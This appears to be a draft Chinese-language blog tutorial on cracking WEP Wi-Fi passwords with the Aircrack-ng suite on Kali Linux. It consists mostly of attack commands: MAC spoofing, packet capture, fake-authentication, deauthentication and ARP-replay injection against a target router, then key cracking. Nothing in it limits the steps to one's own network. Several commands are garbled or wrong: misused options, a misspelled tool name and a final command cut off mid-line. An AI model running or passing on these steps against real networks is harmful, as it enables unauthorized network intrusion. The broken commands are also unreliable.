---
title: '使用kail破解无线网密码'
date: 2019-01-01
category: 'kali&Linux'
tags: []
lang: 'zh'
draft: true
---
### 使用`Aircrack-ng`破解无线网络

##### 无线网络的加密工具有哪些？
---

#### 破解WEP加密的无线网络

**具体操作如下：**

##### 1 使用`airmon-ng`命令查看当前系统中的无线网络接口。

##### 2 修改`wlan0`接口的MAC地址， 因为MAC地址标识主机所在的网络， 在修改MAC地址之前， 需要停止该接口。
命令如下： `airmon-ng stop wlan0`
或者如下： `ifconfig wlan0 down`

执行以上命令使得wlan0接口停止了， 此时可以修改MAC地址了，命令如下：

`macchanger --mac 00:11:22:33:44:55 wlan0`

##### 3 重新启动wlan0

命令如下： `airmon-ng start wlan0`

##### 4 使用airodump 命令定位附近所有可用的无线网络：
命令如下： `airodump-ng wlan0`

输出的信息含义如下：
**BSSID** 无线的IP地址
**PWR** 网卡报告的信号水平
**Beacons** 无线发出的通告编号
**\#Data** 被捕获到的数据分组的数量， 包括广播分组
** #/s **  过去10秒钟内每秒捕获的数据分组的数量

##### 5 使用airodump-ng 捕获指定BSSID的文件
airodump-ng命令常用的选项如下所示。
* -c：指定选择的频道。
* -w：指定一个文件名，用于保存捕获的数据。
* -bssid：指定攻击的BSSID。

示例命令如下： `airodump-ng    -c wirelessattack -bssid Haddr`

##### 6 打开一个新的终端窗口，运行aireplay命令
`airplay` 命令的语法格式如下：
> aireplay-ng -1 0 -a [BSSID] -h [our Chosen MAC address] -e [ESSID] [Interface]
aireplay-ng -dauth 1 -a [BSSID] -c [our Chosen MAC address] [Interface]

示例命令如下: `aireplay-ng -1 0 -a 14:E6:E4:AC:FB:20 -h 00:11:22:33:44:55 -e Test mon0 `

##### 7 使用aireplay发送一些数据给无线路由器，以至于能捕获到数据
> aireplay-ng 3 -b [BSSID] -h [Our chosen MAC address] [Interface]

示例命令：
`aireplay-ng -3 -b 14:E6:E4:AC:FB:20 -h 00:11:22:33:44:55 mon0`

##### 8 使用Aircrack破解密码
示例命令： `aircrack-ng -b Haddr
